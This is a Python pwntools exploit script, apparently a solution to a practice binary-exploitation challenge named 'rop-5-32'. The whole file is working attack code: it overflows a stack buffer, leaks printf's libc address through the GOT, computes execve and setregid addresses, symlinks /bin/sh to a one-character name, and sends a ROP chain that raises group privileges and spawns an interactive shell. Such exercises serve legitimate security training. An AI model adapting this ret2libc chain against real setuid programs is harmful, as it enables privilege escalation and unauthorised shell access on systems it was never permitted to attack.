#!/usr/bin/env python

from pwn import *

p = process("./rop-5-32")

got_of_printf = p.elf.got['printf']
printf_at_plt = p.elf.plt['printf']
input_func = p.elf.symbols['input_func']
print("Got of printf %s" % hex(got_of_printf))
print("Printf@plt %s" % hex(printf_at_plt))
print("input_func() %s" % hex(input_func))

buf = "A" * 0x88 + "BBBB"

buf += p32(printf_at_plt)
buf += p32(input_func)
buf += p32(got_of_printf)

p.recv()

p.sendline(buf)

data = p.recv()

print(repr(data))

raw_data = data[len(buf) + 9:]

print(repr(raw_data))

libc_printf = u32(raw_data[:4])

print("Addr of printf %s" % hex(libc_printf))

printf = 0xf7d75670

exec_offset = 0xf7ddc7e0 - printf
setr_offset = 0xf7e0b5f0 - printf
gete_offset = 0xf7ddd2a0 - printf

libc_execve = libc_printf + exec_offset

libc_setregid = libc_printf + setr_offset

libc_getegid = libc_printf + gete_offset

if os.path.exists("\x34"):
    os.unlink("\x34")

os.symlink("/bin/sh","\x34");

buf = "A" * 0x88 + "BBBB"

buf += p32(libc_setregid)
buf += p32(0x080485da) #pop-pop-ret
#buf += p32(libc_getegid)
#buf += p32(libc_getegid)
buf += p32(50008)
buf += p32(50008)

buf += p32(libc_execve)
buf += p32(0)
buf += p32(0x8048028)
buf += p32(0)
buf += p32(0)

with open("exploit.txt", "wb") as f:
    f.write(buf)

p.sendline(buf)

p.interactive()
